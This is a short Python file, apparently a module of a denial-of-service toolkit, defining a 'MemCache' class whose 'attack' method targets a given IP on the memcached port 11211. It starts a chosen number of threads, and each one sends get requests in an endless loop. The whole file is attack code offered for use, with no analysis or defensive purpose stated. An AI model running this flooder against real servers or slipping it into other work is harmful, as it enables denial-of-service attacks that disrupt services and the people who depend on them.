import memcache as memcache

import threading
from colorama import init, Fore, Back, Style
from socket import *
import time

class MemCache():

  def __init__(self, ip, sleep_time, threading_count):
    self.ip = ip
    self.sleep_time = sleep_time
    self.threading_count = threading_count
    
  def attack(self):

    threads = []

    mem = memcache.Client([self.ip + ":11211"], debug=0)

    def begin():
        while True:  
            mem.get('key')
            if self.sleep_time:
                time.sleep(self.sleep_time)

    for i in range(self.threading_count):
      thread = threading.Thread(target=begin)
      thread.start()
      threads.append(thread)

    for t in threads:
            t.join()